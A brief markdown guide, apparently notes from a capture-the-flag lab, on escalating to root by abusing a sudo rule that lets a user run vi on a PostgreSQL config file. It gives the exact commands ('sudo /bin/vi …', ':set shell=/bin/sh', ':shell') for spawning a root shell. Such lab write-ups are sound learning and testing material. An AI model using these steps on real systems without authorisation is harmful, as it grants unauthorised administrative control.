# `sudo` exploitation
ï·½
* guide on simple sudo exploitation.
[cheatsheet on `vi`](https://gtfobins.github.io/gtfobins/vi/#sudo)
## usage
### vi exploit
* after listing privileges with `sudo -l`, (example output):

  `User postgres may run the following commands on vaccine:
 (ALL) /bin/vi /etc/postgresql/11/main/pg_hba.conf`

* we can see that we can use `vi` to edit `pg-hba.conf`.
  * If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.

using `vi;:set shell =/bin/sh;:shell` we should obtain a shell, according to `GTFOBins.`

* make sure to open the `vi` binary as `sudo` to edit the file we are permitted to, like:
  * `sudo /bin/vi /etc/postgresql/11/main/pg_hba.conf`

* now, from inside the `vi` utility we can set the shell:
  `:set shell=/bin/sh`, 
* and open a shell using
  `:shell`
* verify with `whoami` to check if we are `root` and there we go :)

> [!NOTE]
> to switch to `bash` shell, just input `bash`.

* * Flags are usually found in `/root`.
